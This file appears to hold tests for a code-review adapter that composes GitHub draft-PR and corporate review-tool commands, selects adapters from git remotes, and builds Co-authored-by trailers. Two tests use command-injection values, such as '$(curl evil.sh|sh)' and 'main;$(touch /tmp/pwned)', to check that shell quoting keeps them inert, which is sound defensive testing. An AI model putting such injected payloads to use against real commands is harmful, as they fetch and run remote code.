import { expect, test, describe } from "bun:test";
import { existsSync } from "fs";
import { createStore, upsertActor, recordParticipant, mergeActors, createSession, upsertProject } from "@standup/store";
import type { CodeReviewAdapterId, Project } from "@standup/shared";
import { DEFAULT_ORG_PROFILE } from "../org-profile/default.js";
import { exampleCorpProfile } from "../org-profile/fixtures/example-corp.js";
import type { OrgProfile } from "../org-profile/types.js";
import { setActiveOrgProfile } from "../org-profile/load.js";
import { REVIEW_DESCRIPTION_SECTIONS } from "../review-description.js";
import { reviewAgentNudge } from "../server.js";
import { coAuthorTrailers, composeReviewArtifact, participantsForCoAuthors } from "../review-artifact.js";
import {
  codeReviewAdapters,
  codeReviewRemote,
  projectPipelinePreset,
  projectRequiresIssueId,
  projectRequiresLinkedReview,
  projectReviewLinkFormat,
  selectCodeReviewAdapter,
} from "./adapter.js";
import { genericCodeReviewAdapter } from "./generic.js";
import { GITHUB_PR_ADAPTER } from "./github-pr.js";
import type { ReviewArtifactContext } from "./types.js";

function project(overrides: Partial<Project> = {}): Project {
  return { id: "p", name: "p", branch: "main", repos: ["~/code/p"], ...overrides };
}

function ctx(overrides: Partial<ReviewArtifactContext> = {}): ReviewArtifactContext {
  return {
    worktreePath: "/tmp/wt",
    title: "Fix the widget",
    body: "The widget double-counted on retry.",
    participants: [],
    ...overrides,
  };
}

const CORP: OrgProfile = exampleCorpProfile();
const corpAdapter = genericCodeReviewAdapter(CORP);
const plainAdapter = genericCodeReviewAdapter(DEFAULT_ORG_PROFILE);
const github = GITHUB_PR_ADAPTER;

describe("whether a code review needs the owner's issue id", () => {
  const CORP_REMOTE = "ssh://git@code.example.corp/repos/thing";
  test("only an adapter whose cut command attaches one asks for it", () => {
    expect(plainAdapter.requiresIssueId(project({ codeReviewAdapter: "generic" }))).toBe(false);
    expect(corpAdapter.requiresIssueId(project({ codeReviewAdapter: "generic" }))).toBe(true);
    expect(github.requiresIssueId(project())).toBe(false);
  });

  const cases: Array<[string, Partial<Project>, string[] | null, boolean, boolean]> = [
    // name, project, remotes, under the default profile, under the corp profile
    ["generic, pinned", { codeReviewAdapter: "generic" }, [], false, true],
    ["github-pr, pinned", { codeReviewAdapter: "github-pr" }, [], false, false],
    ["github-pr, pinned, on the org's code host", { codeReviewAdapter: "github-pr" }, [CORP_REMOTE], false, false],
    ["unpinned, on the org's code host", {}, [CORP_REMOTE], false, true],
    ["unpinned, on GitHub and the org's code host", {}, ["https://github.com/example/plain.git", CORP_REMOTE], false, true],
    ["unpinned, repo-less, launched on the org's code host", { repos: [] }, [CORP_REMOTE], false, true],
    ["generic, pinned, on the org's code host", { codeReviewAdapter: "generic" }, [CORP_REMOTE], false, true],
    ["unpinned, on GitHub", {}, ["https://github.com/example/plain.git"], false, false],
    ["unpinned, remotes unread", {}, null, false, false],
    ["unpinned, the org's workspace", { provision: "corp-provision x", repos: [] }, [], false, true],
  ];
  for (const [name, overrides, remotes, inDefault, inCorp] of cases) {
    test(name, () => {
      expect(projectRequiresIssueId(project(overrides), { remotes, profile: DEFAULT_ORG_PROFILE })).toBe(inDefault);
      expect(projectRequiresIssueId(project(overrides), { remotes, profile: CORP })).toBe(inCorp);
    });
  }

  test("no project needs none", () => {
    expect(projectRequiresIssueId(null, { profile: CORP })).toBe(false);
  });

  // The issue-id ask and the cut instructions come from one adapter: a
  // project is asked for an issue id exactly when the command composed for it
  // and its howToCut take one.
  for (const [name, overrides, remotes] of cases) {
    test(`${name}: the ask matches the composed cut command`, async () => {
      for (const profile of [DEFAULT_ORG_PROFILE, CORP]) {
        const p = project(overrides);
        const adapter = selectCodeReviewAdapter(p, profile, { remotes });
        const asks = projectRequiresIssueId(p, { remotes, profile });
        if (!adapter) {
          expect(asks).toBe(false);
          continue;
        }
        const res = await adapter.compose(ctx(), { dryRun: true });
        expect(res.placeholders.some((ph) => ph.includes("<issue-id>"))).toBe(asks);
        expect(adapter.howToCut({ prior: null }).includes("<issue-id>")).toBe(asks);
      }
    });
  }

  test("an unpinned project on the org's code host is composed with the org's review tool, which asks for the issue id", async () => {
    const p = project();
    const adapter = selectCodeReviewAdapter(p, CORP, { remotes: [CORP_REMOTE] })!;
    expect(adapter.id).toBe("generic");
    expect(adapter.howToCut({ prior: null })).toContain("corp-review --issue '<issue-id>'");
    const composed = await adapter.compose(ctx({ branch: "b" }), { dryRun: true });
    expect(composed.command).not.toContain("gh pr create");
    expect(composed.placeholders.some((ph) => ph.includes("<issue-id>"))).toBe(true);
    expect(projectRequiresIssueId(p, { remotes: [CORP_REMOTE], profile: CORP })).toBe(true);
  });

  const selection: Array<[string, Partial<Project>, string[] | null, CodeReviewAdapterId | null, CodeReviewAdapterId | null]> = [
    // name, project, remotes, adapter under the default profile, under the corp profile
    ["unpinned, no remotes read", {}, null, "github-pr", "github-pr"],
    ["unpinned, on GitHub", {}, ["https://github.com/example/plain.git"], "github-pr", "github-pr"],
    ["unpinned, on the org's code host", {}, [CORP_REMOTE], "github-pr", "generic"],
    ["github-pr, pinned, on the org's code host", { codeReviewAdapter: "github-pr" }, [CORP_REMOTE], "github-pr", "github-pr"],
    ["repo-less, no remotes", { repos: [] }, [], null, null],
    ["repo-less, on the org's code host", { repos: [] }, [CORP_REMOTE], null, "generic"],
  ];
  for (const [name, overrides, remotes, inDefault, inCorp] of selection) {
    test(`selects one adapter for ${name}`, () => {
      expect(selectCodeReviewAdapter(project(overrides), DEFAULT_ORG_PROFILE, { remotes })?.id ?? null).toBe(inDefault);
      expect(selectCodeReviewAdapter(project(overrides), CORP, { remotes })?.id ?? null).toBe(inCorp);
    });
  }
});

describe("generic adapter — the built-in default", () => {
  test("is off unless the project opts in", () => {
    expect(plainAdapter.detect(project())).toBe(false);
    expect(plainAdapter.requiresLinkedReview(project())).toBe(false);
    expect(plainAdapter.requiresLinkedReview(project({ codeReviewAdapter: "generic" }))).toBe(true);
    expect(plainAdapter.requiresLinkedReview(project({ codeReviewAdapter: "github-pr" }))).toBe(false);
  });

  test("without an org profile it owns no remote and composes no command", async () => {
    expect(plainAdapter.ownsRemote("https://github.com/o/r.git")).toBe(false);
    const res = await plainAdapter.compose(ctx({ issueId: "I-1" }), { dryRun: true });
    expect(res.providerId).toBe("generic");
    expect(res.command).toBeUndefined();
    expect(res.placeholders).toEqual([]);
    expect(res.descriptionFile!.path).toBe("/tmp/wt/.standup-review-description.md");
  });

  test("the description file is the review-packet-shaped body seeded from the ticket", async () => {
    const res = await plainAdapter.compose(ctx({ issueId: "I-123" }), { dryRun: true });
    const contents = res.descriptionFile!.contents;
    expect(contents.split("\n").filter((l) => l.startsWith("## "))).toEqual(REVIEW_DESCRIPTION_SECTIONS.map((s) => `## ${s}`));
    expect(contents).toContain("## Intent\n\n> The widget double-counted on retry.");
    expect(contents).toContain("- Issue: I-123");
    expect(contents).not.toContain("Co-authored-by");
  });

  test("a review already cut is revised in place: no fresh skeleton", async () => {
    const res = await plainAdapter.compose(ctx({ reviewUrl: "https://review.example/reviews/77" }), { dryRun: true });
    expect(res.descriptionFile).toBeUndefined();
    expect(res.reviseDescriptionFile!.path).toBe("/tmp/wt/.standup-review-description.md");
    const nudge = reviewAgentNudge(undefined, res);
    expect(nudge).toContain("new revision of the review already cut for it — never a new review");
    expect(nudge).toContain("Only if that file is missing");
  });

  test("how to cut and the example link name no tool", () => {
    expect(plainAdapter.howToCut({ prior: null })).toBe("Open the code review first, the way the repo's changes are reviewed.");
    expect(plainAdapter.howToCut({ prior: { id: "77", url: "https://r/77" } })).toBe("Revise the launch's code review 77 rather than cutting a new one.");
    expect(plainAdapter.exampleLink(null)).toEqual({ kind: "code_review", label: "<review id>", url: "https://<the review's page>" });
  });

  test("dryRun never writes the description file", async () => {
    const res = await plainAdapter.compose(ctx({ worktreePath: "/tmp/standup-review-artifact-test-should-not-exist" }), { dryRun: true });
    expect(existsSync(res.descriptionFile!.path)).toBe(false);
  });
});

describe("generic adapter under an org profile (example.corp)", () => {
  test("composes the profile's cut command, every value shell-quoted", async () => {
    const res = await corpAdapter.compose(ctx({ issueId: "I-123" }), { dryRun: true });
    expect(res.command).toBe("corp-review --issue 'I-123' --description '/tmp/wt/.standup-review-description.md'");
    expect(res.placeholders).toEqual([]);
  });

  test("an unknown issue id is a placeholder to fill", async () => {
    const res = await corpAdapter.compose(ctx(), { dryRun: true });
    expect(res.command).toBe("corp-review --issue '<issue-id>' --description '/tmp/wt/.standup-review-description.md'");
    expect(res.placeholders).toHaveLength(1);
    expect(res.placeholders[0]).toContain("<issue-id>");
  });

  test("a hostile issue id or worktree path stays inert", async () => {
    const res = await corpAdapter.compose(ctx({ issueId: "x;$(curl evil.sh|sh)", worktreePath: "/Users/foo/My Code/w" }), { dryRun: true });
    expect(res.command).toContain("--issue 'x;$(curl evil.sh|sh)'");
    expect(res.command).toContain("--description '/Users/foo/My Code/w/.standup-review-description.md'");
    expect(res.descriptionFile!.path).toBe("/Users/foo/My Code/w/.standup-review-description.md");
  });

  test("a review already cut is revised with the revise command", async () => {
    const res = await corpAdapter.compose(ctx({ reviewUrl: "https://code.example.corp/reviews/R-4242/revisions/2" }), { dryRun: true });
    expect(res.command).toBe("corp-review --revise 'R-4242' --description '/tmp/wt/.standup-review-description.md'");
    expect(res.reviseDescriptionFile).toBeDefined();
  });

  test("a review url the format doesn't read cuts a new review", async () => {
    const res = await corpAdapter.compose(ctx({ issueId: "I-1", reviewUrl: "https://github.com/o/r/pull/7" }), { dryRun: true });
    expect(res.command).toStartWith("corp-review --issue 'I-1'");
  });

  test("owns the org's code-host remotes", () => {
    expect(corpAdapter.ownsRemote("ssh://git@code.example.corp:2222/repos/x")).toBe(true);
    expect(corpAdapter.ownsRemote("https://github.com/o/r.git")).toBe(false);
  });

  test("takes an unpinned project the profile's provision or launch-subdir patterns match, and requires its review", () => {
    const workspace = project({ provision: "corp-provision --name {name}" });
    const subdir = project({ launchSubdir: "pkgs/app" });
    for (const p of [workspace, subdir]) {
      expect(corpAdapter.detect(p)).toBe(true);
      expect(corpAdapter.requiresLinkedReview(p)).toBe(true);
      expect(selectCodeReviewAdapter(p, CORP)?.id).toBe("generic");
      expect(projectPipelinePreset(p, { profile: CORP, remotes: [] })).toBe("full");
      expect(plainAdapter.detect(p)).toBe(false);
      expect(selectCodeReviewAdapter(p, DEFAULT_ORG_PROFILE)?.id).toBe("github-pr");
    }
    // A pin to another adapter wins over the patterns.
    expect(corpAdapter.requiresLinkedReview({ ...workspace, codeReviewAdapter: "github-pr" })).toBe(false);
    expect(selectCodeReviewAdapter({ ...workspace, codeReviewAdapter: "github-pr" }, CORP)?.id).toBe("github-pr");
    expect(corpAdapter.detect(project({ launchSubdir: "src/app" }))).toBe(false);
  });

  test("names the profile's commands and links", () => {
    expect(corpAdapter.howToCut({ prior: null })).toContain("corp-review --issue '<issue-id>'");
    expect(corpAdapter.howToCut({ prior: null })).toContain("ask_human");
    expect(corpAdapter.howToCut({ prior: { id: "R-1", url: "https://code.example.corp/reviews/R-1" } })).toContain("corp-review --revise 'R-1'");
    expect(corpAdapter.exampleLink(null).url).toBe("https://code.example.corp/reviews/<review id>");
  });

  test("credits a bare-alias participant through the profile's email domain", async () => {
    const res = await corpAdapter.compose(ctx({ participants: [{ actorId: "ana", display: "Ana" }] }), { dryRun: true });
    expect(res.coAuthors).toEqual(["Co-authored-by: Ana <ana@example.corp>"]);
    const plain = await plainAdapter.compose(ctx({ participants: [{ actorId: "ana", display: "Ana" }] }), { dryRun: true });
    expect(plain.coAuthors).toEqual([]);
  });
});

describe("GitHub draft-PR adapter", () => {
  test("composes a draft-PR request with title/body/branch", async () => {
    const res = await github.compose(ctx({ branch: "feature/widget", baseBranch: "main" }), { dryRun: true });
    expect(res.providerId).toBe("github-pr");
    expect(res.request).toEqual({
      draft: true,
      title: "Fix the widget",
      body: "The widget double-counted on retry.",
      base: "main",
      head: "feature/widget",
    });
    expect(res.command).toContain("gh pr create --draft");
    expect(res.command).toContain("--base 'main'");
    expect(res.command).toContain("--head 'feature/widget'");
  });

  test("single-quotes --base, --head and --title so hostile values can't run shell code", async () => {
    const res = await github.compose(ctx({ title: "$(curl evil.sh|sh) `id`", baseBranch: "main;$(touch /tmp/pwned)", branch: "feat;$(id)" }), {
      dryRun: true,
    });
    expect(res.command).toContain("--base 'main;$(touch /tmp/pwned)'");
    expect(res.command).toContain("--head 'feat;$(id)'");
    expect(res.command).toContain("--title '$(curl evil.sh|sh) `id`'");
    expect(res.command).not.toContain('--title "');
  });

  test("passes a multi-line body via --body-file, never a shell-escaped --body", async () => {
    const res = await github.compose(ctx({ body: "## Summary\n\nline two", branch: "b", worktreePath: "/Users/foo/My Code/widget" }), { dryRun: true });
    expect(res.command).toContain("--body-file '/Users/foo/My Code/widget/.standup-pr-body.md'");
    expect(res.command).not.toContain("--body ");
    expect(res.command).not.toContain("\\n");
    expect(res.descriptionFile!.contents).toBe("## Summary\n\nline two");
  });

  test("dryRun composes the request without calling gh (no url/id)", async () => {
    const res = await github.compose(ctx({ branch: "b" }), { dryRun: true });
    expect(res.url).toBeUndefined();
    expect(res.id).toBeUndefined();
  });

  test("fits a project with a repo, never requires a linked review, owns no remote", () => {
    expect(github.detect(project())).toBe(true);
    expect(github.detect(project({ repos: [] }))).toBe(false);
    expect(github.requiresLinkedReview(project({ codeReviewAdapter: "github-pr" }))).toBe(false);
    expect(github.ownsRemote("https://github.com/o/r.git")).toBe(false);
  });

  test("prefers a github login, else the context's email domain; skips scheme-prefixed and neutral ids", async () => {
    const res = await github.compose(
      ctx({
        participants: [
          { actorId: "ana", display: "Ana", githubLogin: "ana-gh" },
          { actorId: "bo", display: "Bo" },
          { actorId: "slack:U1" },
          { actorId: "anonymous" },
        ],
        coAuthorEmailDomain: CORP.identity.emailDomain,
      }),
      { dryRun: true }
    );
    expect(res.coAuthors).toEqual(["Co-authored-by: Ana <ana-gh@users.noreply.github.com>", "Co-authored-by: Bo <bo@example.corp>"]);
    expect(res.request!.body).not.toContain("Co-authored-by");
  });
});

describe("Co-authored-by trailers", () => {
  test("a trailer per participant: github login → no-reply email, explicit email kept", () => {
    expect(
      coAuthorTrailers([
        { actorId: "alice", display: "Alice A", githubLogin: "alice-gh" },
        { actorId: "bob", email: "bob@example.com", display: "Bob B" },
      ])
    ).toEqual(["Co-authored-by: Alice A <alice-gh@users.noreply.github.com>", "Co-authored-by: Bob B <bob@example.com>"]);
  });

  test("no derivable email: skipped, never fabricated; duplicates folded", () => {
    expect(coAuthorTrailers([{ actorId: "nobody", display: "No Body" }])).toEqual([]);
    expect(coAuthorTrailers([{ actorId: "a", githubLogin: "gh" }, { actorId: "a", githubLogin: "gh" }])).toHaveLength(1);
  });

  test("an alias domain credits a bare alias, never a scheme-prefixed or neutral id", () => {
    expect(coAuthorTrailers([{ actorId: "ana" }], "example.corp")).toEqual(["Co-authored-by: ana <ana@example.corp>"]);
    expect(coAuthorTrailers([{ actorId: "slack:U1" }, { actorId: "anonymous" }, { actorId: "local" }], "example.corp")).toEqual([]);
  });
});

describe("adapter selection", () => {
  test("auto-detect: a project with a repo gets github-pr; a repo-less one none", () => {
    expect(selectCodeReviewAdapter(project(), DEFAULT_ORG_PROFILE)?.id).toBe("github-pr");
    expect(selectCodeReviewAdapter(project({ reviewProcess: "review-agent" }), DEFAULT_ORG_PROFILE)?.id).toBe("github-pr");
    expect(selectCodeReviewAdapter(project({ repos: [] }), DEFAULT_ORG_PROFILE)).toBeNull();
  });

  test("a pin overrides auto-detect", () => {
    expect(selectCodeReviewAdapter(project({ codeReviewAdapter: "generic" }), DEFAULT_ORG_PROFILE)?.id).toBe("generic");
    expect(selectCodeReviewAdapter(project({ repos: [], codeReviewAdapter: "generic" }), DEFAULT_ORG_PROFILE)?.id).toBe("generic");
  });

  test("only an opted-in project requires a linked review", () => {
    const plain = { profile: DEFAULT_ORG_PROFILE };
    expect(projectRequiresLinkedReview(project(), plain)).toBe(false);
    expect(projectRequiresLinkedReview(project({ codeReviewAdapter: "generic" }), plain)).toBe(true);
    expect(projectRequiresLinkedReview(null, plain)).toBe(false);
  });

  test("every adapter id is distinct", () => {
    const ids = codeReviewAdapters(DEFAULT_ORG_PROFILE).map((a) => a.id);
    expect(new Set(ids).size).toBe(ids.length);
  });
});

describe("code-review remotes and the pipeline preset", () => {
  test("the default profile owns no remote; the org profile owns its code host", () => {
    expect(codeReviewRemote("ssh://git@code.example.corp/repos/x", DEFAULT_ORG_PROFILE)).toBe(false);
    expect(codeReviewRemote("ssh://git@code.example.corp/repos/x", CORP)).toBe(true);
  });

  test("projectPipelinePreset", () => {
    const base = project({ repos: ["/r"] });
    const plain = { profile: DEFAULT_ORG_PROFILE };
    expect(projectPipelinePreset(null, plain)).toBe("full");
    expect(projectPipelinePreset({ ...base, codeReviewAdapter: "generic" }, { ...plain, remotes: [] })).toBe("full");
    expect(projectPipelinePreset({ ...base, reviewProcess: "command" }, { ...plain, remotes: [] })).toBe("full");
    expect(projectPipelinePreset(base, { ...plain, remotes: null })).toBe("full");
    expect(projectPipelinePreset(base, { ...plain, remotes: ["https://github.com/a/b.git"] })).toBe("light");
    expect(projectPipelinePreset(base, { ...plain, remotes: [] })).toBe("light");
    expect(projectPipelinePreset(base, { ...plain, remotes: ["ssh://git@code.example.corp/repos/x"] })).toBe("light");
    expect(projectPipelinePreset(base, { profile: CORP, remotes: ["ssh://git@code.example.corp/repos/x"] })).toBe("full");
  });
});

describe("participantsForCoAuthors (from the store)", () => {
  test("resolves session participants and their actor identity", () => {
    const store = createStore(":memory:");
    upsertProject(store.db, { id: "p", name: "p", branch: "main", repos: [] });
    createSession(store.db, { id: "S1", projectId: "p", title: "", cwd: "/tmp/S1", status: "running" });
    upsertActor(store.db, "alice", { display: "Alice", githubLogin: "alice-gh" });
    recordParticipant(store.db, "S1", "alice");
    expect(participantsForCoAuthors(store.db, "S1")).toEqual([{ actorId: "alice", display: "Alice", githubLogin: "alice-gh" }]);
    store.close();
  });

  test("credits a merged actor once under its canonical identity", () => {
    const store = createStore(":memory:");
    upsertProject(store.db, { id: "p", name: "p", branch: "main", repos: [] });
    createSession(store.db, { id: "S1", projectId: "p", title: "", cwd: "/tmp/S1", status: "running" });
    upsertActor(store.db, "alice", { display: "Alice", githubLogin: "alice-gh" });
    recordParticipant(store.db, "S1", "alice");
    recordParticipant(store.db, "S1", "slack:U1");
    mergeActors(store.db, "slack:U1", "alice");
    const parts = participantsForCoAuthors(store.db, "S1");
    expect(parts).toHaveLength(1);
    expect(parts[0]!.actorId).toBe("alice");
    store.close();
  });
});

describe("composeReviewArtifact", () => {
  test("auto-selects and runs the adapter in dryRun", async () => {
    const res = await composeReviewArtifact(project(), ctx({ branch: "b" }));
    expect(res?.providerId).toBe("github-pr");
    expect(res?.command).toContain("gh pr create --draft");
  });

  test("credits alias-only co-authors at the active org profile's email domain", async () => {
    setActiveOrgProfile(CORP);
    try {
      const res = await composeReviewArtifact(project(), ctx({ branch: "b", participants: [{ actorId: "bo", display: "Bo" }] }));
      expect(res?.coAuthors).toEqual(["Co-authored-by: Bo <bo@example.corp>"]);
    } finally {
      setActiveOrgProfile();
    }
  });

  test("composes with the adapter its checkouts' remotes select, the one that asks the issue id", async () => {
    const remotes = ["ssh://git@code.example.corp/repos/thing"];
    setActiveOrgProfile(CORP);
    try {
      const res = await composeReviewArtifact(project(), ctx({ branch: "b" }), { dryRun: true }, { remotes });
      expect(res?.providerId).toBe("generic");
      expect(res?.placeholders.some((ph) => ph.includes("<issue-id>"))).toBe(true);
      expect(projectRequiresIssueId(project(), { remotes })).toBe(true);
      expect(projectReviewLinkFormat(project(), { remotes })).toEqual(CORP.codeReview.linkFormat);
      expect((await composeReviewArtifact(project(), ctx({ branch: "b" })))?.providerId).toBe("github-pr");
    } finally {
      setActiveOrgProfile();
    }
  });

  test("returns null when the project has no fitting adapter", async () => {
    expect(await composeReviewArtifact(project({ repos: [] }), ctx())).toBeNull();
  });
});
